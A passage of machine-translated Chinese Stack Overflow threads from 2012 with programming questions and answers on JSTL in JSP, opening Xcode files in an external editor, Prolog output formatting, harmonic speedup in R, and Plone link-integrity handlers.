因此，如果您没有`RegistrationServlet`在任何范围内存储任何实例，则此表达式将始终计算为`null`. 如果你保持这个设计，你的 servlet 的`doGet()`(or `doPost()`) 方法应该有以下行：

```
request.setAttribute("registrationServlet", this); 
```

但它会干净得多

```
request.setAttribute("inputLangs", getInputLangs()); 
```

并且，在 JSP 中：

```
<c:forEach var="lang" items="${inputLangs}"> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T13:34:05.997

您的类路径上有正确的 JSTL jar 文件吗？在您的情况下，/WEB-INF/lib 中的 JSTL 1.1 JAR 文件

[https://stackoverflow.com/tags/jstl/info](https://stackoverflow.com/tags/jstl/info)

# xcode - Xcode — 在外部编辑器中快速打开当前文件

> ID：12300982
> 
> 赞同：3
> 
> 时间：2012-09-06T13:16:13.227
> 
> 标签：xcode, xcode4

是否可以设置键盘快捷键（或者在某处添加一些菜单项）以在外部编辑器中打开当前编辑的文件？

*（显然我可以做[（在文件树中右键单击→在Finder中显示）/（在窗口标题中单击右键→选择包含目录）]→右键单击文件→打开方式→“应用程序”-但步骤太多。 )*

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-09-06T19:13:18.897

呵呵，我找到了。

1.  启动 Automator.app。
2.  选择“服务”。
3.  将“运行 AppleScript”拖放到工作流程中。
4.  将“服务接收”设置为“无输入”，应用程序为Xcode。
5.  粘贴此代码（用您的编辑器替换 MacVim）

    ```
    tell application "Xcode"
        set current_document to last source document
        set current_document_path to path of current_document
    end tell

    tell application "MacVim"
        activate
        open current_document_path
    end tell 
    ```

6.  保存工作流程。

7.  在系统偏好设置 → 键盘 → 键盘快捷键 → 服务 → 常规中，分配一个快捷键。
8.  你完成了！

我从这个项目中借用了 AppleScript 代码：[Uncrustify Automator Services for Xcode 4](https://github.com/tonyarnold/Xcode-4-Uncrustify-Automator-Services)。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-02T21:56:37.357

更好的解决方案是直接在键盘首选项窗格中添加键盘快捷键：

1.  打开“系统偏好设置”→“键盘”→“键盘快捷键”→“应用程序快捷键”
2.  点击“+”加号
3.  选择“XCode”作为应用程序并键入“使用外部编辑器打开”作为菜单标题
4.  设置你的 shourcut（我正在使用 ⇧⌃E）

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2014-03-19T17:19:23.720

因为我使用选项卡，[所以我渴望](https://stackoverflow.com/q/22499621/398861)一个不会从第一个选项卡打开文档的解决方案。我[最终](https://stackoverflow.com/q/22499621/398861)得到以下结果：

注意：如果打开了助手编辑器，无论哪个编辑器处于活动状态，标准编辑器（左侧）中的文件都会打开，但对我来说它比第一个选项卡更好。

```
on run {input, parameters}

    set current_document_path to ""

    tell application "Xcode"
        set last_word_in_main_window to (word -1 of (get name of window 1))
        if (last_word_in_main_window is "Edited") then
            display notification "Please save the current document and try again"
            -- eventually we could automatically save the document when this becomes annoying
        else
            set current_document to document 1 whose name ends with last_word_in_main_window
            set current_document_path to path of current_document
        end if
    end tell

    tell application "MacVim"
        if (current_document_path is not "") then
            activate
            open current_document_path
        end if
    end tell

    return input
end run 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-07-18T15:01:05.100

我真的很喜欢[Fjölnir](https://stackoverflow.com/users/211447/fj%c3%b6lnir)提出的解决方案，所以要扩展如何做到这一点。

1.  选择菜单：“Xcode”->“首选项...”
2.  单击首选项窗口上的“键绑定”选项卡
3.  在“过滤器”搜索框中输入`External`
4.  双击“使用外部编辑器打开（文件菜单）”命令旁边的“键”列。

[![键绑定首选项](../Images/3f04a91b57b24410e5685bb8ee5a019d.png)](https://i.stack.imgur.com/qMPAL.png)

如果您为此使用 MacVim，则可以通过将外部编辑器配置为在最后一个窗口关闭后保持运行来改善外部编辑器的加载时间。

1.  选择菜单：“MacVim”->“首选项...”
2.  在“常规”选项卡中，将“最后一个窗口关闭后”设置为“隐藏 MacVim”

[![MacVim 设置](../Images/2d8731c1db870d7eefa81f83e80ead4e.png)](https://i.stack.imgur.com/uquwE.png)

现在，当我按下`⌥E`弹出窗口时，我进行了更改，`:q`然后焦点返回到 Xcode。

# prolog - 强制 prolog 在输出结果中进行替换

> ID：12300992
> 
> 赞同：2
> 
> 时间：2012-09-06T13:16:39.243
> 
> 标签：prolog, output-formatting

在学习 Prolog 的过程中，我正在制作简单的程序，给定一些东西能够分辨出那个东西的左/右/上/下是什么。代码是这样的：

```
% left_(LeftThing, ToThing)
left_(bicycle, camera).
left_(pencil, clock).
left_(clock, butterfly).
left_(butterfly, fish).

% above_(AboveThing, ToThing)
above_(bicycle, pencil).
above_(camera,  butterfly).

right(X, Y) :-
  left_(Y, X);
  X = (empty).

below(X, Y) :-
  above_(Y, X);
  X = (empty).

left(X, Y) :-
  left_(X, Y);
  X = (empty).

above(X, Y) :-
  above_(X, Y);
  X = (empty).

position(Thing, Left, Right, Above, Below) :-
    left(Left,  Thing),
   right(Right, Thing),
   above(Above, Thing),
   below(Below, Thing), !. 
```

现在当我要求：

`?- position(clock, Left, Right, Above, Below).`

我得到一个答案：

```
左 = 铅笔，
右 = 蝴蝶，
上 = 下，下 = 空。
```

虽然这是完全正确的答案，但我希望 Prolog 进行完全替换并以*标准*方式给出输出：

```
左 = 铅笔，
右 = 蝴蝶，
以上=空，
下面=空。
```

有没有办法强制 Prolog 在输出中进行这样的替换，而不会使程序事实和规则混乱很多？（错误......也许在 SWI-Prolog 配置中有一些结果格式化选项。如果没有 - 如何通过最少的代码更改来实现这一点？）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-06T14:37:16.697

Prolog 找到一个最通用的统一器作为解决方案。这是一个完美的标准，我没有找到[任何标志](http://www.swi-prolog.org/pldoc/doc_for?object=section%282,%272.11%27,swi%28%27/doc/Manual/flags.html%27%29%29)来改变这种行为（虽然我可能错过了一个，也许是一个`toplevel_print_options`自定义谓词或其他东西）。

话虽如此，如果你想要一个漂亮的打印，你可以滚动你自己的打印谓词。顺便说一句，它可以让你清理你的数据库，因为在这里你代表了原始问题中的额外内容，只能返回`empty`，从概念的角度来看，这并不好。我的看法是：

```
% left(LeftThing, ToThing)
left(  bicycle,   camera).
left(  pencil,    clock).
left(  clock,     butterfly).
left(  butterfly, fish).

% above(AboveThing, ToThing)
above( bicycle,   pencil).
above( camera,    butterfly).

right(X, Y) :-
    left(Y, X).

below(X, Y) :-
    above(Y, X).

print_custom(Y, Pred) :-
    (   call(Pred, X, Y)
     -> true
      ; X = empty),
    format('~w = ~w,~n', [Pred, X]).

position(Thing) :-
    maplist( print_custom(Thing),
             [left, right, above, below] ). 
```

测试：

```
?- position(clock).
left = pencil,
right = butterfly,
above = empty,
below = empty,
true. 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-06T15:03:14.293

我找不到[控制这种行为的标志](http://www.swi-prolog.org/pldoc/doc_for?object=current_prolog_flag/2)，并且在内部（参见 boot/toplevel.pl）无条件调用 join_same_bindings/2。

有一个未记录的谓词 print_toplevel_variables/0，但输出没有排序，并且包含与上次查询无关的“历史”变量：

```
?- position(clock, Left, Right, Above, Below).
Left = pencil,
Right = butterfly,
Above = Below, Below = empty.

?- print_toplevel_variables.
$Below =    empty
$Above =    empty
$Right =    butterfly
$Left =     pencil
$X =        false
$T =        position(clock,pencil,butterfly,empty,empty)
$Y =        1
false. 
```

# r - 减少用于计算 R 中的谐波加速的数据帧

> ID：12300993
> 
> 赞同：3
> 
> 时间：2012-09-06T13:16:40.850
> 
> 标签：r, dataframe, reduction

我有一个包含以下信息的数据集：

*   工作负载名称
*   使用的配置
*   测量性能

在这里，您有一个玩具数据集来说明我的问题（性能数据根本没有意义，我只是选择了不同的整数以使示例易于理解。实际上，数据将是来自性能测量的浮点值）：

```
 workload cfg perf
1        a   1    1
2        b   1    2
3        a   2    3
4        b   2    4
5        a   3    5
6        b   3    6
7        a   4    7
8        b   4    8 
```

您可以使用以下方法生成它：

```
dframe <- data.frame(workload=rep(letters[1:2], 4),
                     cfg=unlist(lapply(seq_len(4),
                                function(x) { return(c(x, x)) })),
                     perf=round(seq_len(8))
                    ) 
```

我正在尝试计算不同配置的谐波加速。为此，需要一个基本配置（在本例中为 cfg = 1）。然后谐波加速计算如下：

```
 num_workloads
HS(cfg_i) = num_workloads /   sum     (perf(cfg_base, wl_j) / perf(cfg_i, wl_j))
                              wl_j 
```

例如，对于配置 2，它将是：

```
HS(cfg_2) = 2 / [perf(cfg_1, wl_1) / perf(cfg_2, wl_1) +
                 perf(cfg_1, wl_2) / perf_cfg_2, wl_2)] 
```

我想计算每个工作负载对和配置的谐波加速。通过使用示例数据集，结果将是：

```
 workload.pair cfg      harmonic.speedup
1      a-b       1    2 / (1/1 + 2/2) = 1 
2      a-b       2    2 / (1/3 + 2/4) = 2.4
3      a-b       3    2 / (1/5 + 2/6) = 3.75
4      a-b       4    2 / (1/7 + 2/8) = 5.09 
```

我正在努力寻找一个不使用循环`aggregate`的`ddply`解决方案，但我一直无法想出一个可行的解决方案。所以，我面临的基本问题是：

*   如何处理工作负载和配置之间的关系。给定工作负载对 (AB) 和给定配置的结果必须一起处理（谐波加速公式分母中的前两个性能测量来自工作负载 A，而其他两个来自工作负载 B）
*   对于每个工作负载对和配置，我需要使用配置库中的值“规范化”性能值（示例中的 cfg 1）

我真的不知道如何用一些 R 函数来表达这一点，比如`aggregate`or `ddply`（如果可能的话）。

有谁知道如何解决这个问题？

**编辑：**我有点害怕使用 1..8 as`perf`会导致一些混乱。为了简单起见，我这样做了，但值不需要是那些值（例如，想象像这样初始化它们：）`dframe$perf <- runif(8)`。詹姆斯和扎克的回答都理解我的部分问题是错误的，所以我认为最好在问题中澄清这一点。无论如何，我概括了这两个答案来处理配置 1 的性能不是 (1, 2) 的情况

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T13:50:59.970

试试这个：

```
library(plyr)
baseline <- dframe[dframe$cfg == 1,]$perf
hspeed <- function(x) length(x) / sum(baseline / x)
ddply(dframe,.(cfg),summarise,workload.pair=paste(workload,collapse="-"),
    harmonic.speedup=hspeed(perf))
  cfg workload.pair harmonic.speedup
1   1           a-b         1.000000
2   2           a-b         2.400000
3   3           a-b         3.750000
4   4           a-b         5.090909 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-06T18:42:33.553

对于这样的问题，我喜欢“重塑”数据框，使用`reshape2`包，为工作负载 a 提供一列，为工作负载 b 提供一列。然后很容易使用向量运算比较两列：

```
library(reshape2)
dframe <- dcast(dframe, cfg~workload, value.var='perf')
baseline <- dframe[dframe$cfg == 1, ]
dframe$harmonic.speedup <- 2/((baseline$a/dframe$a)+(baseline$b/dframe$b))
> dframe
  cfg a b harmonic.speedup
1   1 1 2         1.000000
2   2 3 4         2.400000
3   3 5 6         3.750000
4   4 7 8         5.090909 
```

# reference - 对引用进行链接完整性检查？

> ID：12300997
> 
> 赞同：3
> 
> 时间：2012-09-06T13:16:57.967
> 
> 标签：reference, plone

我们自定义了 News Item-type 并将嵌入的图像替换为 ExtendedReferenceField（我们使用中央图像存储库）。

有没有办法在该字段上激活链接完整性检查，以便在尝试删除图像时触发警告？

（是的，在@@editing-controlpanel 中启用了链接完整性检查，当我在内容正文中插入链接和图像时工作得很好）。

使用的 schemaextender 字段的精简代码：

```
from zope.interface import implements
from archetypes.schemaextender.interfaces import ISchemaExtender
from archetypes.schemaextender.interfaces import IBrowserLayerAwareExtender
from archetypes.schemaextender.field import ExtensionField
from Products.Archetypes import atapi
from archetypes.referencebrowserwidget.widget import ReferenceBrowserWidget

class ExtendedReferenceField(ExtensionField, atapi.ReferenceField):
    """ Extention reference field. """

class ImageReferenceExtender(object):
    implements(ISchemaExtender, IBrowserLayerAwareExtender)

    layer = IPackageSpecific

    fields = [
        ExtendedReferenceField(
            name= 'imageref',
            required = False,
            multiValued=False,
            allowed_types=('Image', ),
            relationship='image',
            keepReferencesOnCopy=True,
            widget = ReferenceBrowserWidget(
                ...
                )),
    ]

    def __init__(self, context):
        self.context = context

    def getFields(self):
        return self.fields 
```

这发生在 Plone 版本 3.3.6 和 4.1.6 中。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-07T09:28:51.397

链接完整性通过`isReferencing`在对象之间添加命名的引用来工作，但它只对 TextFields 中的 HTML 链接执行此操作，只要修改了对象。

要支持单个参考字段，您有 2 个选项：

1.  `isReferencing`每当您添加关系时添加关系，当关系消失`image`时再次删除它们，使用事件或扩展器。`image`链接完整性将启动。

2.  `image`将关系的删除作为完整性破坏进行跟踪。您需要检查是否正在删除引用对象。

    看一下包的handlers.py[模块](https://github.com/plone/plone.app.linkintegrity/blob/master/plone/app/linkintegrity/handlers.py)`plone.app.linkintegrity`。每当删除*任何*Archetypes 引用时，`referenceRemoved`都会调用事件处理程序。它更新存储，添加关系的源和目标，并在处理内容对象删除时参考此存储。*`ILinkIntegrityInfo``isReferencing`*

     *为您的参考创建一个新的事件处理程序`image`，它将以相同的方式处理；删除引用的图像，将引发链接完整性警告：

    ```
    from plone.app.linkintegrity.interfaces import ILinkIntegrityInfo
    from Products.Archetypes.interfaces import IReference
    from Acquisition import aq_get

    def imageReferenceRemoved(obj, event):
        assert IReference.providedBy(obj)
        assert obj is event.object # just making sure...
        if not obj.relationship == 'image':
            return
        # if the object the event was fired on doesn't have a `REQUEST` attribute
        # we can safely assume no direct user action was involved and therefore
        # never raise a link integrity exception...
        request = aq_get(obj, 'REQUEST', None)
        if not request:
            return
        storage = ILinkIntegrityInfo(request)
        storage.addBreach(obj.getSourceObject(), obj.getTargetObject()) 
    ```

    在 ZCML 注册：

    ```
     <configure xmlns="http://namespaces.zope.org/zope">
     <subscriber
         for="Products.Archetypes.interfaces.IReference
              zope.lifecycleevent.interfaces.IObjectRemovedEvent"
         handler=".events.imageReferenceRemoved"
         />
     </configure> 
    ```*